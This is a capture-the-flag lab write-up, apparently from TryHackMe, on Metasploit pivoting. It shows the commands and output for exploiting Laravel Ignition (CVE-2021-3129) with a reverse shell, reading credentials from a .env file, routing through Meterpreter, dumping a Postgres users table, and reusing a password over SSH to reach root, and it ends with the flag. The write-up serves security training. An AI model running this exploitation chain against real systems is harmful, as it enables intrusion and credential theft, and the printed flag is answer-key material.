---
title: Day 09 - Pivoting
desc: >-
  Day 9 covers topics related to the use of Metasploit and Meterpreter to
  compromise systems, network pivoting, and post exploitation.
---
## Introduction
Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems.

Meterpreter is an advanced payload that provides interactive access to a compromised system. Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.

Note that normal command shells do not support complex operations such as pivoting. In Metasploit’s console, you can upgrade the last opened Metasploit session to a Meterpreter session with `sessions -u -1`.

Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached allowing the compromised system to become an attack launchpad for other systems in the network. This concept is called `Network Pivoting`.

Metasploit has an internal routing table that can be modified with the `route` command. This routing table determines where to send network traffic through, for instance, through a Meterpreter session.

A socks proxy is an intermediate server that supports relaying networking traffic between two machines. This tool allows you to implement the technique of pivoting. A socks proxy can be run either locally on a pentester’s machine via Metasploit, or directly on the compromised server. In Metasploit, this can be achieved with the `auxiliary/server/socks_proxy` module.

## CTF Questions

Target IP = 10.10.41.251 ($IP)

Enumerate targe using Nmap:

```text
┌──(siachen㉿kali)-[~]
└─$ sudo nmap -sV -O -Pn $IP    
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 11:36 MST
Nmap scan report for 10.10.41.251
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/9%OT=80%CT=1%CU=33099%PV=Y%DS=4%DC=I%G=Y%TM=6393805
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=2%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=3F%W=FAF0%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
```

Examine `port 80` in Firefox. Inspecting the Network tab, we can see that the server responds with an HTTP `Set-Cookie` header indicating that the server is running `Laravel` web application development framework.

```text
Set-Cookie: laravel_session=eyJpdiI6InVZaGVOT0wvNlJOYXF4SnpacjYxMHc9PSIsInZhbHVlIjoiQjREN21IalZ0YXc1WngycXUvamtyVC9rdTA0WUFVTDdiRHArMkVsVEdWMlU0K1IvZ0MzbHlpdWZLc3RJdTQ1U3JqTFpmeTFtbDV4VTg3TzlpOEZJSC8zY3FVakFhYlR3YnZCajZYbU93LzhWeHd3STJ5eC9teU9lampwOEFJN2YiLCJtYWMiOiI0MWFmYjE2YzFlM2U3OWYwMmEzZGJiNDc3MzljNGU2OTRmZjMzMDljODczZjExYjhmZjY1ZWY4NDAyNDg0NjY2In0%3D; expires=Fri, 09-Dec-2022 20:37:07 GMT; Max-Age=7200; path=/; httponly; samesite=lax
```

Laravel may be vulnerable to a remote code execution exploit which impacts applications using debug mode with Laravel versions before 8.4.2, which use ignite as a developer dependency. 

Search Laravel in Metasploit and run info on the exploit to get `CVE-2021-3129`.

```text
msf6 > search laravel

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce                                                                                                                  

msf6 auxiliary(scanner/ssh/ssh_login) > info 1

       Name: Unauthenticated remote code execution in Ignition
     Module: exploit/multi/php/ignition_laravel_debug_rce
   Platform: Unix, Linux, OSX, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-13

Provided by:
  Heyder Andrade <eu@heyderandrade.org>
  ambionics

Module side effects:
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Unix (In-Memory)
  1   Windows (In-Memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting              Required  Description
  ----       ---------------              --------  -----------
  LOGFILE                                 no        Laravel log file absolute path
  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-f
                                                    ramework/wiki/Using-Metasploit
  RPORT      80                           yes       The target port (TCP)
  SSL        false                        no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
  VHOST                                   no        HTTP server virtual host

Payload information:

Description:
  Ignition before 2.5.2, as used in Laravel and other products, allows 
  unauthenticated remote attackers to execute arbitrary code because 
  of insecure usage of file_get_contents() and file_put_contents(). 
  This is exploitable on sites using debug mode with Laravel before 
  8.4.2.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-3129
  https://www.ambionics.io/blog/laravel-debug-rce


View the full module info with the info -d command.
```

Use Metasploit to verify if the application is vulnerable to this exploit. 

```text
msf6 > use multi/php/ignition_laravel_debug_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=10.10.41.251 HttpClientTimeout=20

[*] Checking component version to 10.10.41.251:80
[*] 10.10.41.251:80 - The target appears to be vulnerable.
```

Looks like the version of Laravel application is vulnerable to an RCE. Lets run to module to open a session.

```text
msf6 exploit(multi/php/ignition_laravel_debug_rce) > run rhost=10.10.41.251 lhost=10.2.4.35 HttpClientTimeout=20

[*] Started reverse TCP handler on 10.2.4.35:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.41.251:80
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.2.4.35:4444 -> 10.10.41.251:33158) at 2022-12-09 11:54:22 -0700
whoami

www-data
```

Use the `sessions -u -1` command to upgrade the basic shell to a Meterpreter shell (ensure to `background` the basic shell before upgrading).

```text
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]                                          

[*] Upgrading session ID: 1                                                                                         
[*] Starting exploit/multi/handler                                                                                  
[*] Started reverse TCP handler on 10.2.4.35:4433                                                                   
[*] Sending stage (1017704 bytes) to 10.10.41.251                                                                   
[*] Command stager progress: 100.00% (773/773 bytes)                                                                
msf6 exploit(multi/php/ignition_laravel_debug_rce) > [*] Meterpreter session 2 opened (10.2.4.35:4433 -> 10.10.41.251:39880) at 2022-12-09 11:56:52 -0700

msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions                                                       

Active sessions                                                                                                     
===============                                                                                                     

  Id  Name  Type                   Information               Connection                                             
  --  ----  ----                   -----------               ----------                                             
  1         shell cmd/unix                                   10.2.4.35:4444 -> 10.10.41.251:33158 (10.10.41.251)    
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.2.4.35:4433 -> 10.10.41.251:39880 (172.28.101.50)
```

After interacting with the Meterpreter session with `sessions -i -1` and exploring the target machine, we can see there are database credentials available (`postgres:postgres`):

```text
meterpreter > cat /var/www/.env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:NEMESCXelEv2iYzbgq3N30b9IAnXzQmR7LnSzt70rso=
APP_DEBUG=true
APP_URL=http://localhost

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=postgres
DB_USERNAME=postgres
DB_PASSWORD=postgres

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=null
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

We can use Meterpreter to resolve this remote hostname to an IP address that we can use for attacking purposes:

```text
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51
```

As this is an internal IP address, it won’t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host. To configure the global routing table in msfconsole, ensure you have run the `background` command from within a Meterpreter session:

```text
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
[*] Route added
```

We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. By default, Docker chooses a hard-coded IP of `172.17.0.1` to represent the host machine. We will also add that to our routing table for later scanning:

```text
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
[*] Route added
```

Print the routing table to verify the configuration settings:

```text
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.255    Session 2
   172.28.101.51      255.255.255.255    Session 2

[*] There are currently no IPv6 routes defined.
```

With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target `Postgres`. Starting with a schema dump, followed by running queries to select information out of the database:

```text
msf6 exploit(multi/php/ignition_laravel_debug_rce) > use auxiliary/scanner/postgres/postgres_schemadump 
msf6 auxiliary(scanner/postgres/postgres_schemadump) > run postgres://postgres:postgres@172.28.101.51/postgres

[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
[+] Postgres SQL Server Schema 
 Host: 172.28.101.51 
 Port: 5432 
 ====================

---
- DBName: postgres
  Tables:
  - TableName: users_id_seq
    Columns:
    - ColumnName: last_value
      ColumnType: int8
      ColumnLength: '8'
    - ColumnName: log_cnt
      ColumnType: int8
      ColumnLength: '8'
    - ColumnName: is_called
      ColumnType: bool
      ColumnLength: '1'
  - TableName: users
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'
    - ColumnName: username
      ColumnType: varchar
      ColumnLength: "-1"
    - ColumnName: password
      ColumnType: varchar
      ColumnLength: "-1"
    - ColumnName: created_at
      ColumnType: timestamp
      ColumnLength: '8'
    - ColumnName: deleted_at
      ColumnType: timestamp
      ColumnLength: '8'
  - TableName: users_pkey
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/postgres/postgres_schemadump) > use auxiliary/admin/postgres/postgres_sql 
msf6 auxiliary(admin/postgres/postgres_sql) > run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
[*] Running module against 172.28.101.51

Query Text: 'select * from users'
=================================

    id  username  password  created_at                  deleted_at
    --  --------  --------  ----------                  ----------
    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL

[*] Auxiliary module execution completed
```

To further pivot through the private network, we can create a socks proxy within Metasploit:

```text
msf6 auxiliary(admin/postgres/postgres_sql) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```

This will expose a port on the attacker machine that can be used to run other network tools through, such as `curl` or `proxychains`.

```text
msf6 auxiliary(server/socks_proxy) > curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v
[*] exec: curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v

*   Trying 127.0.0.1:9050...
* SOCKS4 communication to 172.17.0.1:80
* SOCKS4a request granted.
* Connected to localhost (127.0.0.1) port 9050 (#0)
> GET / HTTP/1.1
> Host: 172.17.0.1
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 09 Dec 2022 19:13:11 GMT
< Server: Apache/2.4.54 (Debian)
< X-Powered-By: PHP/7.4.30
< Cache-Control: no-cache, private
< Set-Cookie: XSRF-TOKEN=eyJpdiI6Imc5QUppRWZUY25KVWF3YS80dGZqNXc9PSIsInZhbHVlIjoiRWh3S1NDazAyWit3K1pOQ2liWmN0c3hHYVJHWlp1c2Z4T21WZmdZNWt2MEoxdkU5ZVhKOUlBSUhwQ1JFbVk0eGk3dG9iQVNoMnJlYVlQY1VUZXBLenpHTjU4RytydkYzRWx3emFMbWdYOFFmQlNhNllTcy9tM0ZZTXRoWDhJeW8iLCJtYWMiOiJlZDhhZGQwZWJhODk1OTE1YTMyNmY3NmJiMjQxNDE1Y2ViMTgwNmU2NDJiM2Q0ODk5MDEzNjUwMzljODlmM2RjIn0%3D; expires=Fri, 09-Dec-2022 21:13:11 GMT; Max-Age=7200; path=/; samesite=lax
< Set-Cookie: laravel_session=eyJpdiI6IklLQ0dkU3BSZG12ZkEzazdwK0tLN1E9PSIsInZhbHVlIjoiYlZNOXJXRkJkMUdwTExQK2xjT2hVQnF3NW1Galo3dE94MTYxWkJEMmdRL0VVOHpLRCsvSVkvTU9lNENtKzJVYnVvQ1hDOWNqUHNJdXJCczZXVlRRdWtydlJLRzRIY1hNckZCblZEREo0QjBkWXZrNVdwTGJ6eFp6SGlLSEJncGUiLCJtYWMiOiJhMjU3MDk0OTI3YzBlZjc3N2Q1ZDUzZmQ2Y2UzNjdjYzk0MjM2NzE3NzJiNDI0NzljNjQ5YzE2NjM0NzNhMWVkIn0%3D; expires=Fri, 09-Dec-2022 21:13:11 GMT; Max-Age=7200; path=/; httponly; samesite=lax
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
< 
<!DOCTYPE html>

... etc ...
```

Run Nmap on the compromised machine using `proxychains`.

```text
msf6 auxiliary(server/socks_proxy) > proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
[*] exec: proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 12:14 MST
Nmap scan report for 172.17.0.1
Host is up (0.37s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
```

Let's see if password reuse by the user has occured. Let's try and log in to SSH using the credentials found above (`santa:p4$$w0rd`).

```text
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa:p4$$w0rd@172.17.0.1

[*] 172.17.0.1:22 - Starting bruteforce
[+] 172.17.0.1:22 - Success: 'santa:p4$$w0rd' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 3 opened (10.2.4.35-10.10.41.251:36552 -> 172.17.0.1:22) at 2022-12-09 12:18:38 -0700
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.2.4.35:4444 -> 10.10.41.251:33158 (10.10.41.251)
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.2.4.35:4433 -> 10.10.41.251:39880 (172.28.101.50)
  3         shell linux            SSH siachen @             10.2.4.35-10.10.41.251:36552 -> 172.17.0.1:22 (172.17
                                                             .0.1)
```

Let's interact with the SSH session:

```text
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i -1
[*] Starting interaction with 3...

mesg: ttyname failed: Inappropriate ioctl for device
ls /root
root.txt
cat /root/root.txt
THM{47C61A0FA8738BA77308A8A600F88E4B}
```